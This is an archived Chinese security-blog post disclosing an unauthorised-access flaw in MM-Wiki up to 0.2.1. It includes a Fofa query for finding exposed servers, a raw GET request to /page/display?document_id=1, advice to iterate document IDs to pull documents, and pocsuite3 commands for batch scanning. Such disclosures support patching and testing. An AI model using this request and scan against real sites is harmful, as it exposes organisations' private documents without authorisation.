---
source: "gelusus/wxvl 公众号漏洞文库"
---

#  MM-Wiki 文档管理器未授权访问漏洞（附POC）   
原创 BeiZhe  SheYin   2024-04-27 09:00  
  
**免责声明：**  
本公众号的技术文章来仅供参考，如需转载，请联系公众号。  
  
未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作，  
如因此产生的一切不良后果与文章作者和本公众号无关。  
本文所提供的工具仅用于学习。  
  
**关注公众号回复**  
**edusrc**  
**获**  
**取邀请码**  
  
0x01 前言  
  
  
MM-Wiki 是一个轻量级的企业知识分享与团队协同软件，可用于快速构建企业 Wiki 和团队知识分享平台。部署方便，使用简单，帮助团队构建一个信息共享、文档管理的协作环境。系统存在未授权访问漏洞，攻击者可以未授权获取文档信息。  
  
  
  
  
  
  
  
  
  
  
0x02 影响平台  
```
MM-Wiki <=0.2.1
```  
  
0x03 漏洞复现  
```
Fofa: header="mmwikissid"
```  
  
首页  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fMIPoqZAkaR2xJ7BibAh8qEswvarnD3vRaz7Sr1qrvxzSia3tDAoOdeibfnZhEQD6ARhZfQZ5ajZHu6wuoicX4o1UQ/640?wx_fmt=png&from=appmsg "")  
  
构造payload，发送数据包  
```
GET /page/display?document_id=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close


```  
  
遍历document_id获取文档  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fMIPoqZAkaR2xJ7BibAh8qEswvarnD3vRE0Lsd2NA5ESfgXCwNWovYbQOCzph6ytjvic6kO296JqpQicZjCYyahkw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/fMIPoqZAkaR2xJ7BibAh8qEswvarnD3vRb7U9EemAxyA3RMMH5x4WkFL0sXGGmjDsP9vib9JJ5WI8u72CIomHYXw/640?wx_fmt=png&from=appmsg "")  
  
0x04 修复建议  
```
关注厂商更新产品：
https://github.com/phachon/mm-wiki
```  
  
0x05 参考链接  
```
https://github.com/phachon/mm-wiki
```  
  
  
关注公众号回复**mm-wiki-wsq**  
获取Pocsuite框架POC  
  
使用方法：pocsuite -r mm-wiki-wsq.py -u [url]  
```
pocsuite3安装(python3环境)
pip3 install pocsuite3
设置代理
pocsuite -r POC.py -u [url] --proxy http://IP:PORT
批量验证
pocsuite -r POC.py -f [file.txt]
```  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
